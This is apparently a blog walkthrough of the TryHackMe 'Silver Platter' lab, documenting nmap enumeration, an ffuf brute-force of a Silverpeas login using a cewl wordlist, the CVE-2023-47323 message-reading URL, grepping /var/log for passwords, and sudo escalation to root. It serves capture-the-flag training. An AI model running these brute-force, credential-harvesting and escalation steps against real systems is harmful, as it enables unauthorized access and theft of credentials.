---
title: "TryHackMe Silver Platter — Walkthrough"
date: 2026-01-10 16:45:00 +0300
categories: [TryHackMe, Web]
tags: [silverpeas, cewl, brute-force, cve-2023-47323, privesc]
pin: false
---

Silver Platter involves finding a **Silverpeas** instance, brute-forcing a user password with a **cewl** wordlist, abusing **CVE-2023-47323** to read internal messages, then pivoting through SSH and log analysis to **root**.

## Initial Enumeration

### Nmap scan

```bash
nmap -T4 -n -sC -sV -Pn -p- <TARGET_IP>
```

| Port | Service | Version |
| ---- | ------- | ------- |
| 22 | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 |
| 80 | HTTP | nginx 1.18.0 (Ubuntu) — title: Hack Smarter Security |
| 8080 | HTTP | HTTP proxy — root returns **404** |

Port **80** serves a static marketing site. Port **8080** alone returns 404 until the Silverpeas path is found.

## Shell as tim

### Discovering Silverpeas

The **Contact** section on port 80 (`http://<TARGET_IP>/#contact`) references **Silverpeas** and username **`scr1ptkiddy`**.

Silverpeas commonly lives at `:8080/silverpeas`. Visiting:

```text
http://<TARGET_IP>:8080/silverpeas
```

shows the login page.

### Brute-forcing credentials

The room states breached passwords are disallowed, so **`rockyou.txt`** is a poor fit. Generate a custom list from on-site text:

```bash
cewl http://<TARGET_IP>/ > passwords.txt
```

Brute-force the login servlet:

```bash
ffuf -u 'http://<TARGET_IP>:8080/silverpeas/AuthenticationServlet' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'Login=scr1ptkiddy&Password=FUZZ&DomainId=0' \
  -w passwords.txt -r -mc all -t 100 -fs 8282
```

Discovered password: **`a[REDACTED]g`**.

### Reading messages (CVE-2023-47323)

Log in as **`scr1ptkiddy`**. **CVE-2023-47323** allows authenticated users to read arbitrary messages via:

```text
http://<TARGET_IP>:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=[messageID]
```

Message **ID=6** contains SSH credentials for user **`tim`**.

SSH in and verify the user flag:

```bash
ssh tim@<TARGET_IP>
tim@silver-platter:~$ wc -c user.txt
38 user.txt
```

![Silverpeas login and message ID 6](/assets/img/posts/silver-platter/silverpeas-msg.png)

## Shell as root

### Finding tyler's password in logs

```bash
tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

Group **`adm`** grants read access to most system logs:

```bash
grep -Ri 'password' /var/log 2>/dev/null
```

`/var/log/auth.log.2` contains a **docker run** line with **`DB_PASSWORD=_Z[REDACTED]3/`** for Silverpeas.

`/etc/passwd` shows users **`tyler`** (uid 1000) and **`tim`** (uid 1001):

```bash
cat /etc/passwd | grep 'sh$'
```

`su - tyler` with the recovered password succeeds. **`tyler`** is in group **`sudo`**.

```bash
tyler@silver-platter:~$ sudo -l
User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```

Escalate:

```bash
sudo su -
root@silver-platter:~# wc -c root.txt
38 root.txt
```

## Takeaways

- **Custom wordlists (cewl)** beat generic lists when password policy excludes breached passwords.
- **CVE-2023-47323** turns mailbox IDs into credential leaks.
- **`adm` group** membership enables password discovery in **`auth.log`**.
